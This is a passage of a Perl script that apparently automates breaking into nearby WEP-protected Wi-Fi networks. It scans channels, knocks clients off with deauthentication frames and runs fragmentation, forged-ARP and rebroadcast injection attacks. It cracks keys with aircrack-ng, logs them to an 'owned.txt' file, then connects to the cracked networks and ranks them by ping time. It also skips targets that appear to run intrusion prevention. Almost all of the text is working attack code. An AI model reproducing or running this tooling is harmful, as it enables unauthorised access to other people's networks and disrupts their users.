	###  If it reaches $min_iv, IV should be ripe for cracking


	     if ($all_ap{$all_ap_key}->{'iv'} >= $min_iv){
	       print "\nCollected $all_ap{$all_ap_key}->{'iv'} IVs. Trying to crack...\n";
	#       print "Forking aircrack-ng...\n";

		my $elapsed_cracktime;
		my $min;
		my $sec;


	################    BEGIN AIRCRACK FORK    ###########################################
               print "<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIRCRACK-NG FOR PTW CRACKING...\n" if $debug;
	       die "Could not fork aircrack-ng!: $!\n\n" unless defined (my $aircrack_pid = fork);
	       if ($aircrack_pid == 0){


	         print "<< DEBUG >>: RUNNING \"$aircrack -q -b $all_ap{$all_ap_key}->{'bssid'} inject_dump-01.cap \|\"...\n" if $debug;
	         open AIRCRACK,"aircrack-ng -q -b $all_ap{$all_ap_key}->{'bssid'} inject_dump-01.cap |" or die "Can't run aircrack-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
		 while (<AIRCRACK>){
			chomp;
				if ($keyfound){
				   (my $successrate) = $_ =~ /(\d+)%$/;
				   print "$_\n";

	###  Decloacking... Feature for next version.
				   #if ($successrate < 100){
				       #print "Would you like to decloack?";
				    #}

	### Just to see final IV count after cracking

				    close INJECTDUMP;	
				    print "<< DEBUG >>: READING inject_dump-01.csv TO GET THE FINAL IV COUNT...\n" if $debug;
				    open INJECTDUMP, "inject_dump-01.csv" or last;
				    while (<INJECTDUMP>){
					next if (/^\r$/ || /^BSSID/);
					last if (/^Station/);
					chomp;
					$all_ap{$all_ap_key}->{'iv'} = (split /,\s+/,$_)[10];
					print "OWNED USING $all_ap{$all_ap_key}->{'iv'} IVs!\n";
					print "<< DEBUG >>: COMPUTING ELAPSED TIME...\n" if $debug;
					if ($elapsed_cracktime >= 60){
					    $min = int($elapsed_cracktime / 60);
					    $sec = $elapsed_cracktime % 60;
					    $elapsed_cracktime = sprintf ("%02d:%02d", $min, $sec); 
					    print "Elapsed Time: $elapsed_cracktime\t\t\t".scalar localtime()."\n";
					}else{
					    print "Elapsed Time: 00:$elapsed_cracktime\t\t\t".scalar localtime(). "\n";
					 }



				     }
				      exit(0);
				  }

		        if (/KEY/){ 
                  	      print "<< DEBUG >>: FOUND \/KEY\/ IN aircrack-ng OUTPUT...\n" if $debug;
			      $elapsed_cracktime = time - $start_cracktime;
			      $_ =~ s/\s*//;
			      print $_;
			      ($all_ap{$all_ap_key}->{'key'}) = $_ =~ /\[\s(.*)\s\]/;
			

	### Make sure the existing key will be replaced with a new one in case 15 days have passed since dateowned
			      if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}){
				  print "<< DEBUG >>: OVERWRITING EXISTING KEY FOR $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}...\n" if $debug;
			          open KEYS, "owned.txt" or die "Can't open owned.txt!: $!\n\n";
			          open KEYSTEMP, ">.owned.txt.tmp" or die "Can't write to .owned.txt.tmp!: $!\n\n";
				  print "<< DEBUG >>: READING \"owned.txt\"...\n" if $debug;
			          while (<KEYS>){
				      chomp;
				      next if /$all_ap{$all_ap_key}->{'bssid'}/;
				      print KEYSTEMP "$_\n";
			          }
			          `cp .owned.txt.tmp owned.txt`;
			          close KEYS;
			      }

			      open KEYS, ">>owned.txt" or die "Can't append to owned.txt!: $!\n\n";
			      print "<< DEBUG >>: NOW ADDING ENTRY FOR $all_ap{$all_ap_key}->{'bssid'} TO \"owned.txt\"...\n" if $debug;
		              print KEYS "$all_ap{$all_ap_key}->{'bssid'} === $all_ap{$all_ap_key}->{'channel'} === $all_ap{$all_ap_key}->{'ssid'} === $all_ap{$all_ap_key}->{'key'} === ", time, "\n";
			      $keyfound = 1;
		       }

		 }
	       }
#########################     END AIRCRACK FORK    ###############################################


###  Wait for aircrack to exit. aircrack will always exit after successfully finding the key so the while loop <AIRCRACK> terminates, and we set $cracking = 'done' after it exits 
###  If it cannot find the key, it will keep trying as soon as the dump files have updated after PTW_TRY_STEP(aircrack-ng.c). If it still cannot find the key, the AP will be skipped after $crack_timeout


### Timeout cracking if it aircrack-ng could not find the key after $crack_timeout

eval {
  local %SIG;
  $SIG{ALRM} = sub { print "Could not find the key after $crack_timeout seconds.\nSkipping...\n"; kill(9, $aircrack_pid); };
  alarm $crack_timeout;
};

	 
		waitpid($aircrack_pid, 0); 
		$cracking = 'done';	


	     }

###  This sleep indicates when to try reading the csv again to get the IV counts. On default install of aircrack-ng, perhaps 23 seconds should be safe.
	      sleep 2;
	      ++$ivtimer;

#######################  Display IV counts every 5 seconds ######################

if ($ivtimer % 5 == 0 || $ivtimer == 1){
	      print "$all_ap{$all_ap_key}->{'iv'}" unless $cracking eq 'done';
}
	      print "." if ($ivtimer % 1 == 0);
	      print "\n" if ($ivtimer % 30 == 0);

###################################################################################


############# After 10 sleeps, try Deauth #####################################

	      if ($ivtimer / 10 == $try_deauth && $all_ap{$all_ap_key}->{'iv'} < 100){
		print "\nStill $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds...\nSending Deauth...\n";
		print "<< DEBUG >>: RUNNING \"$aireplay -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress\"...\n" if $debug;
		`aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress`;
		print "<< DEBUG >>: SLEEPING FOR 2 SECONDS...\n" if $debug;
		sleep 2;
		print "Sending Deauth...\n";
		print "<< DEBUG >>: RUNNING \"$aireplay -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress\"...\n" if $debug;
		`aireplay-ng -0 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -h $macaddress`;
		print "Counting IVs...\n"; 
		print "<< DEBUG >>: SLEEPING FOR 2 SECONDS...\n" if $debug;
		sleep 2;
	      }

################################################################################



######################   BEGIN  CLIENT-LESS  ATTACKS  ####################################

######### After 40 sleeps try clientless attacks (fragmentation, rebroadcast) ######################

my @fragment;
my $chosen_packet;
my $xor;
my $fragmentation = '';

	      if ( $ivtimer / 10 == $try_fragment ) { 
		$old_ivcount = $all_ap{$all_ap_key}->{'iv'};
		if ($all_ap{$all_ap_key}->{'iv'} > 0 && $all_ap{$all_ap_key}->{'iv'} < 300 ) {
		    print "\nStill $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds. =(\nThis will take forever. Let's try Fragmentation!\n";
		    print "Waiting for data...";
		
                print "<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIREPLAY-NG FOR FRAGMENTATION ATTACK (-5) TO BE READ FROM VIA FRAGMENT_IPC...\n" if $debug;
		die "Could not fork aireplay-ng!: $!\n\n" unless defined (my $fragment_pid = open(FRAGMENT_IPC, "-|"));
	        print "<< DEBUG >>: COPYING inject_dump-01.cap to inject_dump-01.cap.tmp...\n" if $debug;
		print "<< DEBUG >>: RUNNING \"$aireplay -5 $inject_iface -b $all_ap{$all_ap_key}->{'bssid'} -r inject_dump-01.cap.tmp -h $macaddress 2\>\&1 \|\"...\n" if $debug; 
		if ($fragment_pid == 0){
		  `cp inject_dump-01.cap inject_dump-01.cap.tmp`;
		  open FRAGMENT, "aireplay-ng -5 $inject_iface -b $all_ap{$all_ap_key}->{'bssid'} -r inject_dump-01.cap.tmp -h $macaddress 2>&1 |"; 
		  while (<FRAGMENT>){
			next if /^\s*$/;
			print;
		  }
			exit(0);
		}

######## Timeout fragmentation after frag_timeout seconds  ####################

print "<< DEBUG >>: SETTING TIMEOUT FOR FRAGMENTATION...\n" if $debug;
eval {
  local %SIG;
  $SIG{ALRM} = sub { 	
		    unless ($fragmentation eq 'failed' or $fragmentation eq 'success'){
			$fragmentation = 'timedout';
			kill(9, $fragment_pid); 
		    }


		   };
  alarm $frag_timeout;
};


#################################################################################

                print "<< DEBUG >>: READING STDOUT OF AIREPLAY-NG CHILD PROCESS VIA FRAGMENT_IPC...\n" if $debug;
		while (<FRAGMENT_IPC>){
		     if (/chosen/){	
                  	print "<< DEBUG >>: FOUND \/chosen\/ IN aireplay-ng OUTPUT...\n" if $debug;
		 	$chosen_packet = (split/\s+/,$_)[-1];
			print "\nTrying $chosen_packet...";
		     }	
		     if (/xor/) {
                  	print "<< DEBUG >>: FOUND \/xor\/ IN aireplay-ng OUTPUT...\n" if $debug;
			$fragmentation = 'success';
			$xor = (split/\s+/,$_)[-1];
			chomp($xor);
			print "\nGOT KEYSTREAM!! -> $xor\n";
		        print "<< DEBUG >>: BUILDING ARP PACKET (forged_arp.cap) USING packetforge-ng...\n" if $debug;
			print "<< DEBUG >>: RUNNING \"packetforge-ng -0 -a $all_ap{$all_ap_key}->{'bssid'} -h $macaddress -k 255.255.255.255 -l 255.255.255.255 -y $xor -w forged_arp.cap\"...\n" if $debug;
		        `packetforge-ng -0 -a $all_ap{$all_ap_key}->{'bssid'} -h $macaddress -k 255.255.255.255 -l 255.255.255.255 -y $xor -w forged_arp.cap`;
		        print "Replaying \"forged_arp.cap\"...\n";

                        print "<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIREPLAY-NG FOR ARP REPLAY ATTACK USING THE FORGED ARP PACKET forged_arp...\n" if $debug;
		    	die "Could not fork aireplay-ng for \"forged_arp\"!: $!\n\n" unless defined (my $forged_arpreplay_pid = fork);
		    	if ($forged_arpreplay_pid == 0){
		       	   print "<< DEBUG >>: RUNNING \"$aireplay $inject_iface -3 -r forged_arp.cap -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2>&1\"...\n" if $debug;
		       	   `aireplay-ng $inject_iface -3 -r forged_arp.cap -b $all_ap{$all_ap_key}->{'bssid'} -h $macaddress 2>&1`;
		        }
			print "<< DEBUG >>: SLEEPING FOR 3 SECONDS...\n" if $debug;
		        sleep 3;
		### We don't need two aireplay-ng -3 running so we kill this one after 3 seconds, just enough for the other aireplay-ng -3 to pick up our forged arp
			print "<< DEBUG >>: KILLING OUR SECOND AIREPLAY-NG ARP REPLAY INSTANCE...\n" if $debug;
		        kill (9, $forged_arpreplay_pid);
		     }
		 
		 }


		### Fragmentation will exit either because it has timed out or it has ran out of data. In either case, we'll try rebroadcast

 	          unless ($fragmentation eq 'success'){

		     if ($fragmentation eq 'timedout'){
		         print "\nAttack failed after $frag_timeout seconds.\nTrying rebroadcast (-p 0841)...\n";
		     }else{
			  $fragmentation = 'failed';
		          print "\nTried all data packets. Still nothing.\nTrying rebroadcast (-p 0841)...\n";
		     }	

                     print "<< DEBUG >>: FORKING ANOTHER CHILD PROCESS FOR AIREPLAY-NG FOR REBROADCAST ATTACK (-p 0841)...\n" if $debug;
		     die "Could not fork aireplay-ng!: $!\n\n" unless defined ($aireplay_rebroadcast_pid = fork);
		     if ($aireplay_rebroadcast_pid == 0){
		          print "<< DEBUG >>: RUNNING \"$aireplay $inject_iface -2 -p 0841 -b $all_ap{$all_ap_key}->{'bssid'} -c FF:FF:FF:FF:FF:FF -h $macaddress -r inject_dump-01.cap 2\>\&1\"...\n" if $debug;
		          `aireplay-ng $inject_iface -2 -p 0841 -b $all_ap{$all_ap_key}->{'bssid'} -c FF:FF:FF:FF:FF:FF -h $macaddress -r inject_dump-01.cap 2>&1`;
		     }
			
		  }

	### If IV is still 0 after 40 seconds, we give up.
		
	      }elsif ($all_ap{$all_ap_key}->{'iv'} == 0) {
			print "\n$ivtimer seconds and no ARPs, no Data?\nThis ain't gonna work. Skipping...\n"; 	
			$timeout = 1;
	      }
	  }
	   
	
### 20 sleeps after trying rebroadcast and IVs did not increase at least 10, perhaps we got a bad packet
### Let's try the next one by sending INT to aireplay rebroadcast

	if ($ivtimer / 10 == 60 && ($all_ap{$all_ap_key}->{'iv'} - $old_ivcount) <= 10){
		if ($fragmentation ne ''){
			print "OLD IV: $old_ivcount\n";
			print "\nStill $all_ap{$all_ap_key}->{'iv'} after ". $ivtimer + $frag_timeout . " seconds...\n";
			print "Rebroadcast is not working, trying next data packet...\n";
			print "SENDING SIG INT TO AIREPLAY-NG REBROADCAST PROCESS...\n";
			kill(2, $aireplay_rebroadcast_pid);
		}
	}


##########################   END  CLIENT-LESS  ATTACKS  ####################################



### After 20 minutes (+ $frag_timeout) worth of sleeps

	      if ($ivtimer / 10 == $ap_timeout){
	         if ($fragmentation ne ''){
		     print "\nStill $all_ap{$all_ap_key}->{'iv'} after ". $ivtimer + $frag_timeout . " seconds...\nSkipping...\n";
		 }else{ 	
		     print "\nStill $all_ap{$all_ap_key}->{'iv'} after $ivtimer seconds...\nSkipping...\n";
		 }
		$timeout = 1;
	      }

	




	  }
	}

	}


	###  Wait for Airodump and Aireplay (arp replay) forks to finish and if their done we can exit the FAKE AUTH child
	 waitpid($airodump_pid, 0); 
	 waitpid($aireplay_pid, 0); 
	 waitpid($aireplay_rebroadcast_pid, 0);
	 system("stty", "sane");
	 exit(0);



	       }

### If we suddenly get another error from the AP, e.g, Disassociation, they're probably using WIPS or something, so we skip the ap;

	if (/code/){
           print "<< DEBUG >>: FOUND \/code\/ IN aireplay-ng OUTPUT...\n" if $debug;
    	   print "\nAnother error code after mac spoofing.\n$_\nWIPS could be in place. Skipping...\n\n";
    	   exit;
	} 


	      }

### When <AIREPLAY> ends, that means, FAKEAUTH did not work so we skip this AP
	   print "\nCan't associate. aireplay-ng died!\n\n"; 
	   foreach (@fakeauth){
		print "\t$_";
	   }
	   print "\n\n";
	   exit;
	  

	   }

	###  PARENT of $pid (FAKEAUTH)
	###  Wait for FAKEAUTH child to finish
		waitpid($pid, 0);
		system("stty", "sane");

#########################   END MODE   CRACK  ####################################


#########################   BEGIN  MODE   SORT  ####################################


	  }elsif($mode eq 'sort'){
	   print "\nGetting ping rtt of \"$all_ap{$all_ap_key}->{'ssid'}\" ($all_ap{$all_ap_key}->{'bssid'})\n";
	#   sleep 3;
	     if (exists $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}){	
		$all_ap{$all_ap_key}->{'ssid'} = $owned_ap{$all_ap{$all_ap_key}->{'bssid'}}->{'ssid'};
	        $all_ap{$all_ap_key}->{'rtt'} = connect($all_ap{$all_ap_key}->{'bssid'}, $owned_ap{$all_ap_key}->{'key'}, $all_ap{$all_ap_key}->{'ssid'}, 'ping', $pinghost);
		unless (defined $all_ap{$all_ap_key}->{'rtt'} && $all_ap{$all_ap_key}->{'rtt'} ne ''){
			$all_ap{$all_ap_key}->{'rtt'} = 99999;
		}
		print "Average Ping RTT: $all_ap{$all_ap_key}->{'rtt'}\n\n" if (defined $all_ap{$all_ap_key}->{'rtt'} && $all_ap{$all_ap_key}->{'rtt'} ne "");
			
	     }else{
		print "We don\'t have a key for $all_ap{$all_ap_key}->{'ssid'}. Skipping...\n\n"; 
	    sleep 1;
		next;
	     }
#########################   END  MODE   SORT  ####################################


#########################   BEGIN   MODE  CONNECT  ####################################

	  }elsif($mode eq 'connect'){

	open OWNED, "owned.txt" or die "No APs to connect!!:$!\n\n";
		my $connect_status;
		while (<OWNED>){
			next if /^\s*$/;
			next if /^#$/;
			$bssid = (split / === /, $_)[0]; 
			$ssid = (split / === /, $_)[2]; 
			$key = (split / === /, $_)[3]; 
			print "\nConnecting to \"$ssid\" ($bssid)...\n";
			if (exists $all_ap{$bssid}){	
			  $connect_status = connect($bssid, $key, $ssid, 'connect', $pinghost);
		 	  if ($connect_status eq 'success'){
				print "Successfully connected to \"$ssid\" ($bssid)...\n";
				exit;	
		         }else{
				print "Cannot connect. Trying next AP...\n\n";
				print "######################################\n";	
				sleep 3;
				next;
		    	}

     			}else{
				print "\"$ssid\" ($bssid) is not in our range. Skipping...\n\n";
				print "######################################\n";	
				next;
     			} 
                 }

	   print "\n\nAll APs have been tried. Cannot connect. Try reloading the wireless card driver.\n";
	   exit;

#########################   END   MODE  CONNECT  ####################################
      }

}
#############  END LOOPING THROUGH %all_ap ###################################




#########   AFTER ALL APs HAVE BEEN PROCESSED   ######################
##########   BEGIN SORTING  IF IN MODE: SORT   ####################

print "#########################################################\n";
if ($mode eq 'sort'){

my %unsortedap;
my @outofrange;

print "<< DEBUG >>: NOW SORTING owned.txt...\n" if $debug;
open OWNED, "owned.txt" or die "Can't open owned.txt!: $!\n\n";
while (<OWNED>){
   chomp;
   $bssid = (split/ === /, $_)[0];
   $ssid = (split/ === /, $_)[2];
   if (exists $all_ap{$bssid}->{'rtt'}){
	$unsortedap{$_} = $all_ap{$bssid}->{'rtt'};
   }else{
	push @outofrange, $_;
	print "\"$ssid\" ($bssid) is not in our range. Skipping...\n";
    }

}

print "<< DEBUG >>: WRITING SORTED RTT TO owned_rtt.txt...\n if $debug";
open SORTEDRTT, ">owned_rtt.txt" or die "Can't write to owned_rtt.txt!: $!\n\n";
open SORTED, ">owned_sorted.txt" or die "Can't write to owned_sorted.txt!: $!\n\n";
foreach (sort { $unsortedap{$a} <=> $unsortedap{$b} } keys %unsortedap){
	print SORTEDRTT "$_ === $unsortedap{$_}\n";
	print SORTED "$_\n";
}
close SORTEDRTT;
close SORTED;
system "touch owned_sorted.txt" unless (-e 'owned_sorted.txt');
open SORTED, ">>owned_sorted.txt" or die "Can't append to owned_sorted.txt!: $!\n\n";
foreach (@outofrange){
	print SORTED "$_\n";
}

close SORTED;



system("mv owned_sorted.txt owned.txt");
print "\n\nOutput written to \"owned_rtt.txt\".\nYou should manually compare it with \"owned.txt\"\n\n";
}

######################   END SORTING    ################################







###################   BEGIN SUB CONNECT   ##############################
sub connect{
my $ping_status;
my $bssid = shift;
my $key = shift;
my $ssid = shift;
my $op = shift;
my $pinghost = shift;


if ($op eq 'connect'){
print "Associating...\n";
`iwconfig $inject_iface mode managed`;
`iwconfig $inject_iface ap $bssid`;
`iwconfig $inject_iface essid \'$ssid\'`;
`iwconfig $inject_iface key $key`;

sleep 15;
open IWCONFIG, "iwconfig $inject_iface |" or die "Can't run iwconfig.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
while (<IWCONFIG>){
  if (/linked/){
	print "Associated successfully...\n";
	print "Setting (IP : Gateway) manually... (192.168.1.150 : 192.168.1.1)\n";
   	`ifconfig $inject_iface 192.168.1.150 netmask 255.255.255.0 > /dev/null 2>&1`;
   	`route delete default > /dev/null 2>&1`;
   	`route add default gw 192.168.1.1 > /dev/null 2>&1`;
	print "Testing connectivity...\n";
        $gateway = '192.168.1.1';
	if ($pinghost eq 'gateway'){
	  print "Pinging $gateway...\n";
	}else{
	  print "Pinging $pinghost...\n";
	}
      $ping_status = ($pinghost eq 'gateway')?pingtest($gateway):pingtest($pinghost);
      if ($ping_status eq 'success'){
         return 'success';
      }else{
	  return 'failed';
      }

  }else{
   return 'failed';
  }
}


}elsif($op eq 'ping'){
   my $connect_status = connect($bssid, $key, $ssid, 'connect', $pinghost);
   if ($connect_status eq 'success'){
      print "Successfully connected to \"$ssid\" ($bssid)...\n";
      sleep 2;	
      if ($pinghost eq 'gateway'){
         print "Getting RTT of gateway ($gateway)...\n";
	$pinghost = $gateway;
       }else{
	 print "Getting RTT of $pinghost...\n";
	}
      open PING, "ping -q -c 10 $pinghost |" or die "Can't run ping.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n";
      while (<PING>){
        if (/rtt/){
	  my $rtt = (split/\//, $_)[4];
	  return $rtt;
        }
	 
      }	

	
   }else{
	print "Connection failed. Skipping...\n\n";
	return;
   }

 }

}

###################   END SUB CONNECT   ##############################


###################   BEGIN SUB PINGTEST   ##############################

sub pingtest{
my $pinghost = shift;
$ENV{'pinghost'} = $pinghost; 
my $ping = system("ping -c 5 $pinghost > /dev/null 2>&1"); 



if ($ping != 0){
	if ($manualip == 1){
           print "Ping failed again!!\n";
	   $manualip = 0;
	   return 'failed';
	}
   print "Ping failed!!\n";
   print "Trying DHCP...\n";
	die "Could not fork dhclient!: $!\n\n" unless defined (my $pid = fork);
	if ($pid == 0){
	   `dhclient $inject_iface 2>&1`;
	exit(0);
	}	
	waitpid($pid, 0);
         open NETSTAT, "netstat -rn|" or die "Can't run netstat.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n"; 
         while (<NETSTAT>){
           next unless /^0.0.0.0/;
           $gateway = (split/\s+/,$_)[1];
         }
   $manualip = 1;
   print "Testing connectivity...\n";
      if ($pinghost eq '192.168.1.1'){
	  print "Pinging $gateway...\n";
      }else{
	  print "Pinging $pinghost...\n";
      }
      my $ping_status = ($pinghost eq '192.168.1.1')?pingtest($gateway):pingtest($pinghost);
   if ($ping_status eq 'success'){
       return 'success';
   }else{
	return 'failed';
	}

}else{
  print "Ping successful!!\n";
  return 'success';
}
}


###################   END SUB PINGTEST   ##############################



###################   BEGIN SUB SCAN_AP   ##############################


sub scan_ap{

print "<< DEBUG >>: CLEANING DUMP FILES BEFORE SCANNING...\n" if $debug;
clean;

my %all_ap = ();
my $channel = shift @_;
my $chan_on_file;
my $filename = 'chan'.$channel;
my $csv = $filename.'-01.csv';
my $ssid;
my $bssid;
my $client;
my $iv;
my $ssidlen;


print "<< DEBUG >>: RUNNING AIRODUMP-NG FOR CHANNEL $channel...\n" if $debug;
print "<< DEBUG >>: WRITING OUTPUT TO $csv...\n" if $debug;
die "Could not fork airodump-ng!: $!\n\n" unless defined (my $pid = fork);

if ($pid == 0){
  print "\nScanning channel $channel for WEP-enabled Access Points\n";
  print "<< DEBUG >>: RUNNING \"$airodump $monitor_iface -t wep -c  $channel -n -w $filename 2\>\&1\"...\n" if $debug;
 `airodump-ng $monitor_iface -t wep -c  $channel -n -w $filename 2>&1`;
}

 $| = 1;
 for (my $i = $scan_duration; $i > 0; $i--){
    print ".";
    sleep 1;
 }
# Stop scanning for targets after $scan_duration
print "\n<< DEBUG >>: STOPPING AIRODUMP-NG...\n" if $debug;
kill(9, $pid);
waitpid($pid, 0);
system("stty", "sane");


my $basestation;
print "<< DEBUG >>: PARSING $csv...\n" if $debug;
print "<< DEBUG >>: EXTRACTING ACCESS POINTS AND CONNECTED CLIENTS...\n" if $debug;
open CSV, $csv or die "Cannot open airodump output.: $!\n\n";
while (<CSV>){
chomp;
next if /^\r$/;


if (/^BSSID/){
$basestation = 1;
}

if (/^Station/){
$basestation = 0;
}

if ($basestation){
next if /^BSSID/;
  $chan_on_file = (split /,\s+/,$_)[3];
  next if $channel != $chan_on_file;
  my @uglyssid = (split/,/, $_,13);
  $ssid = "@uglyssid"; 
  ($ssid) = $ssid =~ /\d+,\s+(.+)\s+.$/;
  chop $ssid;
  $ssidlen = length($ssid); 
  $ssid =~ s/\x00*//g;
  #$ssid =~ s/^\s*$/hidden/;
  $ssid =~ s/^\s*$/$hssid/;
  $bssid = (split /,\s+/,$_)[0];
  $iv = (split /,\s+/,$_)[10];
 $all_ap{ $bssid } = {
			 bssid => $bssid,
			 iv => $iv,
			 channel => $chan_on_file,
			 ssid => $ssid,
			 ssidlen => $ssidlen,
			 key => '',
			 dateowned => '',
			 clients => []
			}; 

}else{
 next if /not/;
 next if (/^Station/);
  $bssid = (split /,\s+/,$_)[5];
  $client = (split /,\s+/,$_)[0];

### Store clients to the 'client' anonymous array we have created before
### exists check is for the BSSIDs we find here that we didn't find above (meaning, we only found the bssid because of the client)
  if (exists $all_ap{$bssid}){
      print "<< DEBUG >>: SAVING CONNECTED CLIENTS of $bssid...\n" if $debug;
      push @{$all_ap{$bssid}->{'clients'}}, $client;
  }
}



}


$apcount = scalar keys %all_ap;
print "<< DEBUG >>: ADDING FOUND APs TO found_ap.txt...\n" if $debug;
open FOUNDAP, ">>found_ap.txt" or die "Cant write to found_ap.txt: $!\n\n";
print "\nFound $apcount AP(s) on channel $channel\n\n";
if ($apcount != 0){
   print "     BSSID\t\tIV\tCHANNEL\tSSID\t       ASSOCIATED CLIENTS\n\n";
   for (keys %all_ap){
	print FOUNDAP "$all_ap{$_}->{'bssid'}\t$all_ap{$_}->{'channel'}\t$all_ap{$_}->{'ssid'}\n";
	print "$all_ap{$_}->{'bssid'}\t$all_ap{$_}->{'iv'}\t$all_ap{$_}->{'channel'}\t", ($all_ap{$_}->{'ssid'} eq $hssid)?"hidden (len: $all_ap{$_}->{'ssidlen'})          ":"$all_ap{$_}->{'ssid'}         ";
## Append client list at the end of the line separated by comma (we temporarily alter the print output field separator).
	$" = ', ';	
	   print "@{$all_ap{$_}->{'clients'}}\n";
	$" = ' ';
   }
}
print "\n";

return \%all_ap;
}

###################   END SUB SCANAP   ##############################




sub clean{
  print "<< DEBUG >>: RUNNING \"rm chan* inject* replay* deauth* fragment* forged* 2\>\&1\"...\n" if $debug;
  `rm chan* inject* replay* deauth* fragment* forged* 2>&1`;
}



##################    BEGIN  SUB  SET_IFACE    #################################

sub set_iface{

my $start_iface = 0;
my $start_mon_iface = 0;
my $inject_iface = shift;
my $monitor_error;
my $atheros = 0;
my $mac80211 = 0;


open AIRMONSTART, "airmon-ng start $inject_iface |" or die "Can't run airmon-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n"; 

while (<AIRMONSTART>){
  if ($monitor_error){
	next unless /ERROR/;
	$set_monitor_error = $_;
	return 'error';
  }
     if (/^$inject_iface/ && $start_iface != 1){
        $start_iface = 1;
     }  

  if ($start_mon_iface){
		
      if ($mac80211){
         $monitor_iface = (split/\s+/,$_)[-1];
         $monitor_iface =~ tr/a-z0-9//cd unless !defined $monitor_iface;
      }

      if ($atheros){
         $monitor_iface = (split/\s+/,$_)[0];
      }


      if (defined $monitor_iface && $monitor_iface ne ''){
         return $monitor_iface;
      }else{
	$monitor_error = 1;
	next;
	}	

     
  }

  if ($start_iface){
      if (/\[/){
     	  $start_mon_iface = 1;
	  $mac80211 = 1;
	  next;
       }elsif(/^wifi\d/){
	 $start_mon_iface = 1;
	 $atheros = 1;	
	 next;
	}else{
	  return $inject_iface;
       }


    }





  }


} 

##################    END  SUB  SET_IFACE    #################################




##################   BEGIN  SUB  SELECT_IFACE   ###############################

sub select_iface{

my $timeout = time + shift;
my $answer;

while (time < $timeout){
  $answer = ReadKey(1);
return $answer if defined $answer;
}

}
##################   END  SUB  SELECT_IFACE   ###############################
